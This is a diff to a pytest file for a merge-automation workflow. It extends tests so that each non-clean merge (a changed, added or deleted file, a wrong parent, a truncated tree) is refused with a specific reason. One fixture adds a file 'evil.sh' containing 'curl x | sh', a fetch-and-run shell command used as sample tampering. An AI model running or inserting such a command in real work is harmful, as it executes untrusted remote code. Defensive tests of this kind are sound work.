@@ -929,28 +929,31 @@ def _differing(path: str, content: bytes) -> dict[str, bytes]:
     return {**CLEAN, path: content}
 
 
-@pytest.mark.parametrize("how, kwargs", [
+@pytest.mark.parametrize("how, kwargs, why", [
     # A file the merge base, the head and main agree on, changed in the merge.
-    ("a_file_neither_parent_changed_is_changed", {"files": _differing("readme.txt", b"pwned\n")}),
+    ("a_file_neither_parent_changed_is_changed", {"files": _differing("readme.txt", b"pwned\n")}, "readme.txt"),
     # main's change to a file only main changed, dropped.
-    ("mains_change_is_dropped", {"files": _differing("readme.txt", b"widgets\n")}),
+    ("mains_change_is_dropped", {"files": _differing("readme.txt", b"widgets\n")}, "readme.txt"),
     # The line merge's result, with one more line.
     ("a_line_merged_file_carries_a_line_more",
-     {"files": _differing("notes.txt", b"ONE\ntwo\nthree\nFOUR\nfive\n")}),
+     {"files": _differing("notes.txt", b"ONE\ntwo\nthree\nFOUR\nfive\n")}, "notes.txt"),
     # A file nobody had, added in the merge.
-    ("a_file_is_added_in_the_merge", {"files": {**CLEAN, "evil.sh": b"curl x | sh\n"}}),
+    ("a_file_is_added_in_the_merge", {"files": {**CLEAN, "evil.sh": b"curl x | sh\n"}}, "evil.sh"),
     # A file both parents keep, deleted in the merge.
     ("a_file_is_deleted_in_the_merge",
-     {"files": {k: v for k, v in CLEAN.items() if k != "pr.txt"}}),
+     {"files": {k: v for k, v in CLEAN.items() if k != "pr.txt"}}, "pr.txt"),
     # A clean tree, but the second parent is not on main.
-    ("its_second_parent_is_not_on_main", {"on_main": False}),
+    ("its_second_parent_is_not_on_main", {"on_main": False}, "its second parent is not on main"),
     # A clean tree, but onto a head this workflow never pushed.
-    ("its_first_parent_is_not_an_accepted_head", {"first": "a" * 40}),
+    ("its_first_parent_is_not_an_accepted_head", {"first": "a" * 40},
+     "its first parent is not an accepted head"),
     # A tree GitHub served only in part.
-    ("its_tree_was_truncated", {"truncated": True}),
+    ("its_tree_was_truncated", {"truncated": True}, "GitHub truncated the merge's tree"),
 ])
 def test_a_persons_merge_that_is_not_a_clean_merge_of_main_stays_head_moved(tmp_path, how,
-                                                                             kwargs):
+                                                                             kwargs, why):
+    """Each case is refused for its own reason, not an incidental one: a
+    bare file name is that file not being the clean merge."""
     world = MergeWorld(tmp_path)
     head = _person_merge(world, **kwargs)
     world.pr["head"]["sha"] = head
@@ -959,6 +962,9 @@ def test_a_persons_merge_that_is_not_a_clean_merge_of_main_stays_head_moved(tmp_
     assert outcome.summary["refusal"]["code"] == "head_moved", (how, outcome.summary)
     assert world.merge_calls() == [] and world.update_calls() == []
     assert "pure_base_merges" not in outcome.summary
+    if " " not in why:
+        why = f"{why} is not the clean merge of its parents"
+    assert outcome.summary["refusal"]["commit"]["why"] == why, (how, outcome.summary)
 
 
 def test_a_merge_where_both_parents_change_the_same_lines_stays_head_moved(tmp_path):
@@ -972,6 +978,8 @@ def test_a_merge_where_both_parents_change_the_same_lines_stays_head_moved(tmp_p
     world.pr["head"]["sha"] = head
     outcome = merge.run_merge(world.context())
     assert outcome.summary["refusal"]["code"] == "head_moved", outcome.summary
+    assert outcome.summary["refusal"]["commit"]["why"] == (
+        "both parents change the same lines of notes.txt")
     assert world.merge_calls() == []
 
 
